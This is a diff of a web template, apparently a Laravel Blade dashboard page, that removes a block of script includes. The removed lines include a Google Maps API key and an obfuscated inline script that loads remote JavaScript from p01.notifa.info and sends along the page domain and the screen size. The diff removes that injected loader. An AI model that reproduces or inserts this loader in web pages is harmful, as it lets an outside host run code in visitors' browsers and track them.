@@ -339,30 +339,7 @@
     <script src="{{asset('assets/js/jquery.min.js')}}"></script>
     <!-- Include all compiled plugins (below), or include individual files as needed -->
     <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
-    <script src="{{asset('assets/js/visible.js')}}"></script>
-    <script src="{{asset('assets/js/owl.carousel.min.js')}}"></script>
-    <script src="{{asset('assets/js/jquery.nstSlider.min.js')}}"></script>
-    <script src="{{asset('assets/js/bootstrap-select.min.js')}}"></script>
-    <script src="{{asset('assets/js/plyr.js')}}"></script>
-    <script src="{{asset('assets/js/jquery-migrate-3.0.1.js')}}"></script>
-    <script src="{{asset('assets/js/jquery.magnific-popup.min.js')}}"></script>
-    <script src="{{asset('assets/js/js-flickr-gallery.js')}}"></script>
-    <script src="{{asset('assets/js/tinymce.min.js')}}"></script>
-    <script src="{{asset('assets/js/isotope.pkgd.min.js')}}"></script>
-    <script src="{{asset('assets/js/imagesloaded.pkgd.min.js')}}"></script>
-    <script src="{{asset('assets/js/jquery.ajaxchimp.min.js')}}"></script>
-
-    <!-- leaflet -->
-    <script src="{{asset('assets/leaflet/js/dummylatlng.js')}}"></script>
-    <script src="{{asset('assets/leaflet/js/leaflet-src.js')}}"></script>
-    <script src="{{asset('assets/leaflet/js/leaflet.markercluster-src.js')}}"></script>
-
-    <script src="{{asset('js/custom.js')}}"></script>
     <script src="{{asset('js/dashboard.js')}}"></script>
-    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAmiJjq5DIg_K9fv6RE72OY__p9jz0YTMI"></script>
-    <script src="{{asset('js/map.js')}}"></script>
-    <script src="{{asset('js/searchMap.js')}}"></script>
-  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH21UyEHQgB6pLhKiZJ%2f1h3ODC7%2foPHtxMk1Og7TQF2CjihCdD11kR9VmE5ZbLWM%2bK0GMuRD1YWgDTbxDUVn9oz5tV5%2fDYUkYnvaXAuU8JHh2wnOoUxpf%2b9whVznhRVAJ1EkEoihyHI40qRPl7j41g32P8q%2bhB6mXBkrcnntMjwiZKcQfGFEeu76KKw8eMBPBeU3v5VA%2bsUw1IY5PxDqnX4FwfWpQiVSTB%2f0YV%2fYAIZdNWnOZWQFPhmjzsHc%2bp5KFCNsWN6nufu%2bTzcqIqs0VprM%2bImMoye3ORt2xHQG8YcwdLFmrdXRzP7lMYV79uzi%2f3yZxoU94GdLSi4wMsNaYJ2j%2btdjQnScvMQVfKz%2fUBvg1liEliSm1X3l%2b%2bZr7sRfuSszMA8raPjpQ43jfWooCtt7XKlLdxoV6ixfL8TInm3CYrXrOVNLgt7DwXBLtsLkulDwfMBO4uOgQ925g66QCx7urq8GGy44iBm3lpJ78HQxm4ZS7yzg3CrSTXRFxzC2aa30HbvuB3ONdc%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/Dropify/0.2.2/js/dropify.min.js"></script>
 
     <script>
